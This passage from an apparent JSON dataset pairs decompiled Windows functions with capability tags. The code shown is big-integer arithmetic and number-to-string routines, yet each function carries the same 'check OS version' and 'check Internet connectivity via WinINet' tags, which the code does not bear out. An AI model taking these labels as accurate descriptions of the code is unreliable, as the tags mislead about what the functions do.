}\n                            else {\n                                var_748h = NULL;\n                                var_758h = NULL;\n                                puVar13 = puVar10;\n                                if (var_3a4h != NULL) {\n                                    do {\n                                        if (puVar13 == 0x73) break;\n                                        if (puVar13 == puVar15) {\n                                            (&var_740h)[puVar13] = 0;\n                                            var_744h = var_758h + 1 + puVar10;\n                                        }\n                                        uVar3 = var_74ch[var_758h];\n                                        uVar12 = var_770h[puVar10];\n                                        uVar4 = uVar3 * uVar12;\n                                        uVar5 = uVar4 + var_748h;\n                                        puVar15 = &var_740h + puVar13;\n                                        uVar7 = *puVar15;\n                                        *puVar15 = *puVar15 + uVar5;\n                                        var_748h = (uVar3 * uVar12 >> 0x20) + CARRY4(uVar4, var_748h) +\n                                                   CARRY4(uVar7, uVar5);\n                                        var_758h = var_758h + 1;\n                                        puVar13 = puVar13 + 1;\n                                        puVar15 = var_744h;\n                                    } while (var_758h != var_3a4h);\n                                    if (var_748h != NULL) {\n                                        puVar11 = puVar13;\n                                        var_758h = &var_740h + puVar13;\n                                        do {\n                                            if (puVar11 == 0x73) goto code_r0x00469b0f;\n                                            puVar13 = puVar11 + 1;\n                                            if (puVar11 == puVar15) {\n                                                *var_758h = 0;\n                                                var_744h = puVar13;\n                                            }\n                                            puVar8 = var_758h + 1;\n                                            uVar3 = *var_758h;\n                                            *var_758h = *var_758h + var_748h;\n                                            var_748h = CARRY4(uVar3, var_748h);\n                                            puVar15 = var_744h;\n                                            puVar11 = puVar13;\n                                            var_758h = puVar8;\n                                        } while (var_748h != NULL);\n                                    }\n                                }\n                                if (puVar13 == 0x73) {\ncode_r0x00469b0f:\n                                    var_954h = 0;\n                                    puVar6 = &var_950h;\n                                    goto code_r0x00469b24;\n                                }\n                            }\n                            puVar10 = puVar10 + 1;\n                        } while (puVar10 != var_764h);\n                    }\n                    iVar9 = puVar15 << 2;\n                    var_3a4h = puVar15;\n                    goto code_r0x00469aa2;\n                }\n                var_3a4h = var_574h;\n                fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, var_574h << 2);\n                if (uVar3 != 0) {\n                    if ((uVar3 != 1) && (var_3a4h != NULL)) {\n                        uVar12 = 0;\n                        puVar15 = NULL;\n                        do {\n                            uVar7 = auStack928[puVar15 + -1];\n                            uVar4 = uVar3 * uVar7;\n                            auStack928[puVar15 + -1] = uVar4 + uVar12;\n                            uVar12 = (uVar3 * uVar7 >> 0x20) + CARRY4(uVar4, uVar12);\n                            puVar15 = puVar15 + 1;\n                        } while (puVar15 != var_3a4h);\n                        goto code_r0x004698d5;\n                    }\n                    goto code_r0x00469aba;\n                }\n                var_574h = NULL;\n                var_3a4h = NULL;\n                iVar9 = 0;\n                puVar6 = &var_570h;\ncode_r0x00469aa9:\n                fcn.0046cb87(&var_3a0h, 0x1cc, puVar6, iVar9);\ncode_r0x00469aba:\n                bVar16 = true;\n            }\n            if (!bVar16) goto code_r0x00469b49;\n        }\n        if (var_76ch % 10 != 0) {\n            var_760h = *((var_76ch % 10) * 4 + 0x4815fc);\n            if (var_760h == NULL) {\ncode_r0x00469b49:\n                var_3a4h = NULL;\n                puVar6 = &var_3a0h;\ncode_r0x0046a020:\n                var_954h = 0;\n                fcn.0046cb87(puVar6, 0x1cc, &var_950h, 0);\n            }\n            else if ((var_760h != 0x1) && (var_3a4h != NULL)) {\n                uVar3 = 0;\n                puVar15 = NULL;\n                do {\n                    uVar12 = auStack928[puVar15 + -1];\n                    uVar7 = ZEXT48(var_760h) * uVar12;\n                    auStack928[puVar15 + -1] = uVar7 + uVar3;\n                    uVar3 = (ZEXT48(var_760h) * uVar12 >> 0x20) + CARRY4(uVar7, uVar3);\n                    puVar15 = puVar15 + 1;\n                } while (puVar15 != var_3a4h);\n                if (uVar3 != 0) {\n                    if (0x72 < var_3a4h) goto code_r0x00469b49;\n                    auStack928[var_3a4h + -1] = uVar3;\n                    var_3a4h = var_3a4h + 1;\n                }\n            }\n        }\n    }\n    pcVar14 = var_778h;\n    var_748h = var_778h;\n    if (var_1d4h != NULL) {\n        uVar3 = 0;\n        puVar15 = NULL;\n        do {\n            uVar12 = (&var_1d0h)[puVar15];\n            uVar7 = uVar12 * 10;\n            (&var_1d0h)[puVar15] = uVar7 + uVar3;\n            uVar3 = (uVar12 * 10 >> 0x20) + CARRY4(uVar7, uVar3);\n            puVar15 = puVar15 + 1;\n        } while (puVar15 != var_1d4h);\n        if (uVar3 != 0) {\n            if (var_1d4h < 0x73) {\n                (&var_1d0h)[var_1d4h] = uVar3;\n                var_1d4h = var_1d4h + 1;\n            }\n            else {\n                var_954h = 0;\n                var_1d4h = NULL;\n                fcn.0046cb87(&var_1d0h, 0x1cc, &var_950h, 0);\n            }\n        }\n    }\n    iVar9 = fcn.0046a520(&var_1d4h, &var_3a4h);\n    if (iVar9 == 10) {\n        var_76ch = var_76ch + 1;\n        var_748h = pcVar14 + 1;\n        *pcVar14 = '1';\n        if (var_3a4h != NULL) {\n            uVar3 = 0;\n            puVar15 = NULL;\n            do {\n                uVar12 = auStack928[puVar15 + -1];\n                uVar7 = uVar12 * 10;\n                auStack928[puVar15 + -1] = uVar7 + uVar3;\n                uVar3 = (uVar12 * 10 >> 0x20) + CARRY4(uVar7, uVar3);\n                puVar15 = puVar15 + 1;\n            } while (puVar15 != var_3a4h);\n            if (uVar3 != 0) {\n                if (var_3a4h < 0x73) {\n                    auStack928[var_3a4h + -1] = uVar3;\n                    var_3a4h = var_3a4h + 1;\n                }\n                else {\n                    var_954h = 0;\n                    var_3a4h = NULL;\n                    fcn.0046cb87(&var_3a0h, 0x1cc, &var_950h, 0);\n                }\n            }\n        }\n    }\n    else {\n        if (iVar9 == 0) {\n            uVar3 = var_76ch - 1;\n            goto code_r0x0046a182;\n        }\n        var_748h = pcVar14 + 1;\n        *pcVar14 = iVar9 + '0';\n    }\n    pcVar14 = pcVar14 + 1;\n    uVar3 = var_76ch;\ncode_r0x0046a182:\n    *var_784h = uVar3;\n    if (((-1 < uVar3) && (arg_10h < 0x80000000)) && (arg_14h == 0)) {\n        arg_10h = arg_10h + uVar3;\n    }\n    uVar3 = arg_20h - 1U;\n    if (arg_10h <= arg_20h - 1U) {\n        uVar3 = arg_10h;\n    }\n    var_764h = var_778h + uVar3;\n    var_765h = 0;\n    if (pcVar14 != var_764h) {\n        do {\n            pcVar1 = var_748h;\n            if (var_1d4h == NULL) break;\n            uVar3 = 0;\n            puVar15 = NULL;\n            do {\n                uVar12 = (&var_1d0h)[puVar15];\n                uVar7 = uVar12 * 1000000000;\n                (&var_1d0h)[puVar15] = uVar7 + uVar3;\n                uVar3 = (uVar12 * 1000000000 >> 0x20) + CARRY4(uVar7, uVar3);\n                puVar15 = puVar15 + 1;\n            } while (puVar15 != var_1d4h);\n            if (uVar3 != 0) {\n                if (var_1d4h < 0x73) {\n                    (&var_1d0h)[var_1d4h] = uVar3;\n                    var_1d4h = var_1d4h + 1;\n                }\n                else {\n                    var_954h = 0;\n                    var_1d4h = NULL;\n                    fcn.0046cb87(&var_1d0h, 0x1cc, &var_950h, 0);\n                }\n            }\n            var_760h = fcn.0046a520(&var_1d4h, &var_3a4h);\n            uVar3 = var_764h - pcVar1;\n            uVar12 = 8;\n            do {\n                uVar2 = ZEXT48(var_760h) % var_750h + 0x30;\n                var_754h = ZEXT48(var_760h) % var_750h & 0xffffff00 | uVar2;\n                var_760h = var_760h / var_750h;\n                if (uVar12 < uVar3) {\n                    pcVar1[uVar12] = uVar2;\n                }\n                else if (uVar2 != 0x30) {\n                    var_765h = 1;\n                }\n                uVar12 = uVar12 - 1;\n            } while (uVar12 != 0xffffffff);\n            if (9 < uVar3) {\n                uVar3 = 9;\n            }\n            pcVar14 = pcVar1 + uVar3;\n            var_748h = pcVar14;\n        } while (pcVar14 != var_764h);\n    }\n    *pcVar14 = '\\0';\n    fcn.004303e9(var_954h);\n    return;\n}\n",
        "token_count": 9548
    },
    "0046a520": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046a888)\n// WARNING: Removing unreachable block (ram,0x0046a863)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.0046a520(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint64_t uVar17;\n    uint var_220h;\n    uint var_21ch;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint32_t *var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar17 = CONCAT44(var_10h, var_34h);\n    var_8h = *arg_8h;\n    if ((var_8h != 0) && (var_14h = *arg_ch,  var_14h != 0)) {\n        uVar3 = var_8h - 1;\n        uVar11 = var_14h - 1;\n        var_ch = uVar3;\n        if (uVar11 == 0) {\n            uVar11 = arg_ch[1];\n            if (uVar11 == 1) {\n                uVar3 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.0046cb87(arg_8h + 1, 0x1cc, &var_21ch, 0);\n                return uVar3;\n            }\n            if (uVar3 != 0) {\n                var_ch = 0;\n                var_4h = 0;\n                uVar14 = 0;\n                uVar2 = 0;\n                if (uVar3 != 0xffffffff) {\n                    var_18h = arg_8h + var_8h;\n                    do {\n                        var_14h = uVar14 >> 0x20;\n                        uVar4 = fcn.00476c00(*var_18h, uVar14, uVar11, 0);\n                        var_4h = var_ch;\n                        var_ch = uVar4;\n                        uVar14 = fcn.00476c70();\n                        var_18h = var_18h + -1;\n                        var_8h = var_8h - 1;\n                        uVar2 = uVar14;\n                    } while (var_8h != 0);\n                }\n                var_14h = uVar2 >> 0x20;\n                *arg_8h = 0;\n                fcn.0046cb87(arg_8h + 1, 0x1cc, &var_21ch, 0);\n                arg_8h[1] = uVar2;\n                arg_8h[2] = var_14h;\n                *arg_8h = (var_14h != 0) + 1;\n                return CONCAT44(var_4h, var_ch);\n            }\n            uVar3 = arg_8h[1];\n            *arg_8h = 0;\n            fcn.0046cb87(arg_8h + 1, 0x1cc, &var_21ch, 0);\n            uVar8 = uVar3 % uVar11;\n            arg_8h[1] = uVar8;\n            *arg_8h = uVar8 != 0;\n            return uVar3 / uVar11;\n        }\n        if (uVar11 <= uVar3) {\n            iVar9 = uVar3 - uVar11;\n            if (iVar9 <= uVar3) {\n                puVar5 = arg_8h + var_8h;\n                puVar10 = arg_ch + var_14h;\n                do {\n                    if (*puVar10 != *puVar5) {\n                        if (*puVar5 <= *puVar10) goto code_r0x0046a6cb;\n                        break;\n                    }\n                    uVar3 = uVar3 - 1;\n                    puVar10 = puVar10 + -1;\n                    puVar5 = puVar5 + -1;\n                } while (iVar9 <= uVar3);\n            }\n            iVar9 = iVar9 + 1;\ncode_r0x0046a6cb:\n            if (iVar9 != 0) {\n                var_20h = arg_ch[var_14h - 1];\n                var_30h = arg_ch[var_14h];\n                var_1ch = 0x1f;\n                if (var_30h != 0) {\n                    for (; var_30h >> var_1ch == 0; var_1ch = var_1ch + -1) {\n                    }\n                }\n                if (var_30h == 0) {\n                    var_1ch = 0x20;\n                }\n                else {\n                    var_1ch = 0x1f - var_1ch;\n                }\n                var_2ch = 0x20 - var_1ch;\n                if (var_1ch != 0) {\n                    var_30h = var_30h << (var_1ch & 0x1f) | var_20h >> (var_2ch & 0x1f);\n                    var_20h = var_20h << (var_1ch & 0x1f);\n                    if (2 < var_14h) {\n                        var_20h = var_20h | arg_ch[var_14h - 2] >> (var_2ch & 0x1f);\n                    }\n                }\n                var_50h = iVar9 + -1;\n                var_4ch = 0;\n                if (var_50h < 0) {\n                    uVar3 = 0;\n                    var_4ch = 0;\n                }\n                else {\n                    var_38h = var_50h + var_14h;\n                    var_3ch = arg_8h + iVar9;\n                    var_18h = arg_8h + (var_38h - 1);\n                    uVar3 = var_4ch;\n                    do {\n                        var_4ch = uVar3;\n                        if (var_ch < var_38h) {\n                            var_48h = 0;\n                        }\n                        else {\n                            var_48h = var_18h[2];\n                        }\n                        var_4h = var_18h[1];\n                        uVar3 = *var_18h;\n                        var_24h = var_48h;\n                        var_8h = uVar3;\n                        if (var_1ch != 0) {\n                            uVar6 = var_2ch;\n                            uVar14 = fcn.00476ee0();\n                            var_10h = uVar17 >> 0x20;\n                            var_34h = uVar17;\n                            var_24h = uVar14 >> 0x20;\n                            var_4h = uVar14 | uVar3 >> (uVar6 & 0x1f);\n                            var_8h = uVar3 << (var_1ch & 0x1f);\n                            if (2 < var_38h) {\n                                var_8h = var_8h | var_18h[-1] >> (var_2ch & 0x1f);\n                            }\n                        }\n                        uVar11 = var_30h;\n                        uVar15 = fcn.00476c00(var_4h, var_24h, var_30h, 0);\n                        var_10h = uVar17 >> 0x20;\n                        var_34h = uVar17;\n                        uVar3 = uVar15;\n                        _var_44h = uVar15;\n                        uVar11 = fcn.00476c70(var_4h, var_24h, uVar11, 0);\n                        var_10h = uVar15 >> 0x20;\n                        var_34h = uVar15;\n                        var_4h = 0;\n                        uVar16 = uVar11;\n                        if (var_10h != 0) {\n                            uVar16 = fcn.00476ea0(uVar3 + 1, var_10h + -1 + (0xfffffffe < uVar3), var_30h, 0);\n                            var_10h = uVar15 >> 0x20;\n                            var_34h = uVar15;\n                            uVar3 = 0xffffffff;\n                            uVar15 = 0xffffffff;\n                            _var_44h = 0xffffffff;\n                        }\n                        var_4h = uVar16 >> 0x20;\n                        var_24h = var_8h;\n                        uVar17 = uVar15;\n                        while (var_4h == 0) {\n                            var_4h = uVar16 >> 0x20;\n                            uVar11 = uVar16;\n                            var_8h = var_24h;\n                            uVar16 = fcn.00476ea0();\n                            var_10h = uVar15 >> 0x20;\n                            var_34h = uVar15;\n                            uVar17 = uVar15 & 0xffffffff00000000 | uVar3;\n                            if (uVar16 <= CONCAT44(uVar11, var_24h)) break;\n                            bVar13 = uVar3 != 0;\n                            uVar3 = uVar3 - 1;\n                            uVar8 = var_10h + -1 + bVar13;\n                            uVar15 = uVar15 & 0xffffffff | uVar8 << 0x20;\n                            _var_44h = CONCAT44(uVar8, uVar3);\n                            var_4h = var_4h + CARRY4(uVar11, var_30h);\n                            uVar16 = CONCAT44(var_4h, uVar11 + var_30h);\n                            var_24h = var_8h;\n                            uVar17 = _var_44h;\n                        }\n                        var_10h = uVar17 >> 0x20;\n                        var_34h = uVar17;\n                        var_40h = _var_44h >> 0x20;\n                        if ((var_10h != 0) || (uVar3 != 0)) {\n                            uVar8 = 0;\n                            uVar11 = 0;\n                            if (var_14h != 0) {\n                                puVar5 = arg_ch + 1;\n                                var_4h = var_14h;\n                                puVar10 = var_3ch;\n                                do {\n                                    iVar1 = (_var_44h & 0xffffffff) * *puVar5;\n                                    uVar3 = iVar1;\n                                    uVar12 = uVar8 + uVar3;\n                                    uVar8 = uVar11 + (iVar1 >> 0x20) + var_40h * *puVar5 + CARRY4(uVar8, uVar3);\n                                    uVar11 = 0;\n                                    if (*puVar10 < uVar12) {\n                                        bVar13 = 0xfffffffe < uVar8;\n                                        uVar8 = uVar8 + 1;\n                                        uVar11 = bVar13;\n                                    }\n                                    *puVar10 = *puVar10 - uVar12;\n                                    puVar10 = puVar10 + 1;\n                                    puVar5 = puVar5 + 1;\n                                    var_4h = var_4h - 1;\n                                    uVar3 = var_34h;\n                                } while (var_4h != 0);\n                            }\n                            if ((uVar11 != 0) || (var_48h < uVar8)) {\n                                if (var_14h != 0) {\n                                    uVar8 = 0;\n                                    puVar10 = var_3ch;\n                                    puVar5 = arg_ch + 1;\n                                    uVar11 = var_14h;\n                                    do {\n                                        uVar3 = *puVar10;\n                                        uVar12 = *puVar5;\n                                        uVar7 = uVar3 + *puVar5;\n                                        *puVar10 = uVar7 + uVar8;\n                                        uVar8 = CARRY4(uVar3, uVar12) + CARRY4(uVar7, uVar8);\n                                        uVar11 = uVar11 - 1;\n                                        puVar10 = puVar10 + 1;\n                                        uVar3 = var_34h;\n                                        puVar5 = puVar5 + 1;\n                                    } while (uVar11 != 0);\n                                }\n                                uVar3 = uVar3 - 1;\n                            }\n                            var_ch = var_38h - 1;\n                        }\n                        var_3ch = var_3ch + -1;\n                        var_50h = var_50h + -1;\n                        var_38h = var_38h - 1;\n                        var_18h = var_18h + -1;\n                    } while (-1 < var_50h);\n                }\n                uVar11 = var_ch + 1;\n                if (uVar11 < *arg_8h) {\n                    puVar10 = arg_8h + var_ch + 2;\n                    uVar8 = uVar11;\n                    do {\n                        *puVar10 = 0;\n                        puVar10 = puVar10 + 1;\n                        uVar8 = uVar8 + 1;\n                    } while (uVar8 < *arg_8h);\n                }\n                *arg_8h = uVar11;\n                while ((uVar11 != 0 && (arg_8h[uVar11] == 0))) {\n                    uVar11 = uVar11 - 1;\n                    *arg_8h = uVar11;\n                }\n                return CONCAT44(var_4ch, uVar3);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3249
    },
    "0046aa50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3cch\n\nvoid __cdecl fcn.0046aa50(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t *arg_8h_00;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint *arg_10h;\n    uint var_3cch;\n    uint var_3c8h;\n    uint32_t var_1f4h;\n    uint32_t *var_1f0h;\n    uint32_t *var_1ech;\n    uint32_t *var_1e8h;\n    uint32_t var_1e4h;\n    uint32_t var_1e0h;\n    uint32_t var_1dch;\n    uint32_t *var_1d8h;\n    uint32_t var_1d4h;\n    uint var_1d0h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    uVar8 = *arg_ch;\n    var_1d8h = arg_8h;\n    var_1e8h = arg_ch + 1;\n    if (uVar8 < 2) {\n        uVar3 = *var_1e8h;\n        if (uVar3 != 0) {\n            if ((uVar3 == 1) || (uVar8 = *arg_8h,  uVar8 == 0)) goto code_r0x0046ad54;\n            uVar7 = 0;\n            uVar6 = 0;\n            do {\n                uVar1 = uVar3 * arg_8h[uVar6 + 1];\n                uVar2 = uVar1 + uVar7;\n                uVar7 = (uVar3 * arg_8h[uVar6 + 1] >> 0x20) + CARRY4(uVar1, uVar7);\n                (arg_8h + 1)[uVar6] = uVar2;\n                uVar6 = uVar6 + 1;\n                arg_8h_00 = arg_8h + 1;\n            } while (uVar6 != uVar8);\ncode_r0x0046aadd:\n            if (uVar7 != 0) {\n                if (*var_1d8h < 0x73) {\n                    var_1d8h[*var_1d8h + 1] = uVar7;\n                    *var_1d8h = *var_1d8h + 1;\n                    fcn.004303e9(var_3cch);\n                    return;\n                }\n                *var_1d8h = 0;\n                arg_10h = &var_1d0h;\n                var_1d4h = 0;\ncode_r0x0046ad92:\n                fcn.0046cb87(arg_8h_00, 0x1cc, arg_10h, 0);\n                fcn.004303e9(var_3cch);\n                return;\n            }\n            goto code_r0x0046ad54;\n        }\n        *arg_8h = 0;\n        var_1d4h = uVar3;\n    }\n    else {\n        var_1dch = *arg_8h;\n        arg_8h_00 = arg_8h + 1;\n        var_1ech = arg_8h_00;\n        if (var_1dch < 2) {\n            uVar3 = *arg_8h_00;\n            *arg_8h = uVar8;\n            fcn.0046cb87(arg_8h_00, 0x1cc, arg_ch + 1, *arg_ch << 2);\n            if (uVar3 == 0) {\n                *arg_8h = 0;\n                var_1d4h = uVar3;\n                fcn.0046cb87(arg_8h_00, 0x1cc, &var_1d0h, 0);\n                fcn.004303e9(var_3cch);\n                return;\n            }\n            if ((uVar3 == 1) || (uVar8 = *arg_8h,  uVar8 == 0)) goto code_r0x0046ad54;\n            uVar7 = 0;\n            uVar6 = 0;\n            do {\n                uVar1 = uVar3 * var_1ech[uVar6];\n                uVar2 = uVar1 + uVar7;\n                uVar7 = (uVar3 * var_1ech[uVar6] >> 0x20) + CARRY4(uVar1, uVar7);\n                var_1ech[uVar6] = uVar2;\n                uVar6 = uVar6 + 1;\n                arg_8h_00 = var_1ech;\n            } while (uVar6 != uVar8);\n            goto code_r0x0046aadd;\n        }\n        var_1e4h = var_1dch;\n        puVar9 = arg_8h_00;\n        var_1f0h = var_1e8h;\n        if (uVar8 < var_1dch) {\n            var_1e4h = uVar8;\n            uVar8 = var_1dch;\n            puVar9 = var_1e8h;\n            var_1f0h = arg_8h_00;\n        }\n        uVar3 = 0;\n        var_1d4h = 0;\n        var_1e0h = 0;\n        do {\n            var_1e8h = puVar9;\n            var_1dch = uVar8;\n            if (puVar9[var_1e0h] == 0) {\n                if (var_1e0h == uVar3) {\n                    uVar3 = var_1e0h + 1;\n                    (&var_1d0h)[var_1e0h] = 0;\n                    var_1d4h = uVar3;\n                }\n            }\n            else {\n                uVar7 = 0;\n                var_1f4h = 0;\n                uVar6 = var_1e0h;\n                if (uVar8 != 0) {\n                    do {\n                        if (uVar6 == 0x73) break;\n                        if (uVar6 == uVar3) {\n                            (&var_1d0h)[uVar6] = 0;\n                            var_1d4h = var_1e0h + 1 + var_1f4h;\n                        }\n                        uVar3 = var_1f0h[var_1f4h];\n                        uVar1 = puVar9[var_1e0h];\n                        uVar4 = uVar3 * uVar1;\n                        uVar2 = (&var_1d0h)[uVar6];\n                        uVar5 = uVar4 + (&var_1d0h)[uVar6];\n                        (&var_1d0h)[uVar6] = uVar5 + uVar7;\n                        uVar7 = (uVar3 * uVar1 >> 0x20) + CARRY4(uVar4, uVar2) + CARRY4(uVar5, uVar7);\n                        var_1f4h = var_1f4h + 1;\n                        uVar6 = uVar6 + 1;\n                        uVar3 = var_1d4h;\n                    } while (var_1f4h != uVar8);\n                    if (uVar7 != 0) {\n                        uVar1 = uVar6;\n                        puVar10 = &var_1d0h + uVar6;\n                        do {\n                            if (uVar1 == 0x73) goto code_r0x0046ad67;\n                            uVar6 = uVar1 + 1;\n                            if (uVar1 == uVar3) {\n                                *puVar10 = 0;\n                                var_1d4h = uVar6;\n                            }\n                            uVar3 = *puVar10;\n                            *puVar10 = *puVar10 + uVar7;\n                            uVar7 = CARRY4(uVar3, uVar7);\n                            uVar3 = var_1d4h;\n                            uVar1 = uVar6;\n                            puVar10 = puVar10 + 1;\n                        } while (uVar7 != 0);\n                    }\n                }\n                if (uVar6 == 0x73) {\ncode_r0x0046ad67:\n                    var_3cch = 0;\n                    *arg_8h = 0;\n                    arg_10h = &var_3c8h;\n                    goto code_r0x0046ad92;\n                }\n            }\n            var_1e0h = var_1e0h + 1;\n        } while (var_1e0h != var_1e4h);\n        *arg_8h = uVar3;\n        uVar3 = uVar3 << 2;\n    }\n    fcn.0046cb87(arg_8h + 1, 0x1cc, &var_1d0h, uVar3);\ncode_r0x0046ad54:\n    fcn.004303e9(var_3cch);\n    return;\n}\n",
        "token_count": 2143
    },
    "0046aea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5a8h\n\nvoid __cdecl fcn.0046aea0(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t *arg_8h_00;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t var_5a8h;\n    uint var_5a4h;\n    uint32_t var_3d0h;\n    uint32_t var_3cch;\n    uint32_t var_3c8h;\n    uint32_t var_3c4h;\n    uint32_t *var_3c0h;\n    uint32_t var_3bch;\n    uint32_t var_3b8h;\n    uint32_t *var_3b4h;\n    uint32_t var_3b0h;\n    uint32_t *var_3ach;\n    uint32_t *var_3a8h;\n    uint32_t var_3a4h;\n    uint32_t var_3a0h;\n    uint32_t var_1d4h;\n    uint var_1d0h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_3cch = arg_ch / 10;\n    puVar11 = arg_8h + 1;\n    var_3d0h = var_3cch;\n    arg_8h_00 = puVar11;\n    var_3a8h = puVar11;\n    var_3ach = arg_8h;\n    do {\n        if (var_3cch == 0) {\n            iVar6 = arg_ch + var_3d0h * -10;\n            if (iVar6 != 0) {\n                uVar5 = *(iVar6 * 4 + 0x4815fc);\n                if (uVar5 == 0) {\n                    *arg_8h = 0;\n                    fcn.0046cb87(arg_8h_00, 0x1cc, &var_5a4h, 0);\n                    var_5a8h = uVar5;\n                }\n                else if ((uVar5 != 1) && (uVar9 = *arg_8h,  uVar9 != 0)) {\n                    uVar10 = 0;\n                    uVar7 = 0;\n                    do {\n                        uVar3 = uVar5 * var_3a8h[uVar7];\n                        uVar4 = uVar3 + uVar10;\n                        uVar10 = (uVar5 * var_3a8h[uVar7] >> 0x20) + CARRY4(uVar3, uVar10);\n                        var_3a8h[uVar7] = uVar4;\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 != uVar9);\n                    if (uVar10 != 0) {\n                        if (0x72 < *var_3ach) {\n                            *var_3ach = 0;\n                            fcn.0046cb87(var_3a8h, 0x1cc, &var_5a4h, 0);\n                            fcn.004303e9(0);\n                            return;\n                        }\n                        var_3ach[*var_3ach + 1] = uVar10;\n                        *var_3ach = *var_3ach + 1;\n                        fcn.004303e9(var_5a8h);\n                        return;\n                    }\n                }\n            }\n            fcn.004303e9(var_5a8h);\n            return;\n        }\n        var_3bch = var_3cch;\n        var_3a8h = puVar11;\n        if (0x26 < var_3cch) {\n            var_3bch = 0x26;\n            var_3a8h = arg_8h_00;\n        }\n        uVar5 = *(var_3bch * 4 + 0x481566);\n        uVar9 = *(var_3bch * 4 + 0x481567);\n        var_3a4h = uVar5 + uVar9;\n        fcn.00431db0(&var_3a0h, 0, uVar5 * 4);\n        fcn.004312b0(&var_3a0h + uVar5, *(var_3bch * 4 + 0x481564) * 4 + 0x480c60, uVar9 * 4);\n        arg_8h_00 = var_3a8h;\n        puVar8 = var_3ach;\n        if (var_3a4h < 2) {\n            if (var_3a0h == 0) {\n                var_1d4h = var_3a0h;\n                *arg_8h = 0;\n                fcn.0046cb87(var_3a8h, 0x1cc, &var_1d0h, 0);\n                bVar1 = true;\n                puVar8 = arg_8h;\n                arg_8h_00 = var_3a8h;\n            }\n            else {\n                if ((var_3a0h != 1) && (uVar5 = *arg_8h,  arg_8h = var_3ach,  uVar5 != 0)) {\n                    uVar10 = 0;\n                    uVar9 = 0;\n                    do {\n                        uVar7 = var_3a0h * var_3a8h[uVar9];\n                        uVar3 = uVar7 + uVar10;\n                        uVar10 = (var_3a0h * var_3a8h[uVar9] >> 0x20) + CARRY4(uVar7, uVar10);\n                        var_3a8h[uVar9] = uVar3;\n                        uVar9 = uVar9 + 1;\n                    } while (uVar9 != uVar5);\ncode_r0x0046afec:\n                    puVar8 = var_3ach;\n                    arg_8h = var_3ach;\n                    if (uVar10 != 0) {\n                        if (*var_3ach < 0x73) {\n                            var_3ach[*var_3ach + 1] = uVar10;\n                            bVar1 = true;\n                            *var_3ach = *var_3ach + 1;\n                            arg_8h_00 = var_3a8h;\n                        }\n                        else {\n                            var_3a4h = 0;\n                            *var_3ach = 0;\n                            fcn.0046cb87(var_3a8h, 0x1cc, &var_3a0h, 0);\n                            bVar1 = false;\n                            arg_8h_00 = var_3a8h;\n                        }\n                        goto code_r0x0046b2ec;\n                    }\n                }\ncode_r0x0046b04a:\n                bVar1 = true;\n                puVar8 = arg_8h;\n                arg_8h_00 = var_3a8h;\n            }\n        }\n        else {\n            uVar5 = *arg_8h;\n            var_3b0h = uVar5;\n            if (uVar5 < 2) {\n                uVar5 = *var_3a8h;\n                *arg_8h = var_3a4h;\n                fcn.0046cb87(var_3a8h, 0x1cc, &var_3a0h, var_3a4h * 4);\n                if (uVar5 != 0) {\n                    if ((uVar5 != 1) && (uVar9 = *arg_8h,  arg_8h = var_3ach,  uVar9 != 0)) {\n                        uVar10 = 0;\n                        uVar7 = 0;\n                        do {\n                            uVar3 = uVar5 * var_3a8h[uVar7];\n                            uVar4 = uVar3 + uVar10;\n                            uVar10 = (uVar5 * var_3a8h[uVar7] >> 0x20) + CARRY4(uVar3, uVar10);\n                            var_3a8h[uVar7] = uVar4;\n                            uVar7 = uVar7 + 1;\n                        } while (uVar7 != uVar9);\n                        goto code_r0x0046afec;\n                    }\n                    goto code_r0x0046b04a;\n                }\n                *arg_8h = 0;\n                var_3a4h = uVar5;\n                fcn.0046cb87(arg_8h_00, 0x1cc, &var_3a0h, 0);\n                bVar1 = 